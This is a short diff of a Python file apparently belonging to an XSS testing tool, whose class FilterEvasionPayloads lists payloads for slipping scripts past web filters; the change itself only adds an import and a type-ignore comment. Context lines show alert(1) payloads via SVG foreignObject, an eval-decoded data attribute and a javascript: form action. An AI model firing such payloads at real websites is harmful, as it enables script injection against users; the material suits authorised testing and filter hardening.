@@ -11,7 +11,7 @@ Created: Вс 10 авг 2025 19:35:00 MSK
 Telegram: https://t.me/EasyProTech
 """
 
-from typing import List
+from typing import List, Optional
 
 
 class FilterEvasionPayloads:
@@ -79,7 +79,7 @@ class FilterEvasionPayloads:
             '<foreignObject><script>alert(1)</script></foreignObject>',
             
             # Data attributes
-            '<div data-x="&lt;script&gt;alert(1)&lt;/script&gt;" onclick="eval(this.dataset.x.replace(/&lt;/g,'<').replace(/&gt;/g,'>'))">',
+            '<div data-x="&lt;script&gt;alert(1)&lt;/script&gt;" onclick="eval(this.dataset.x.replace(/&lt;/g,'<').replace(/&gt;/g,'>'))">',  # type: ignore[list-item]
             
             # Form elements
             '<form action="javascript:alert(1)"><input type=submit>',
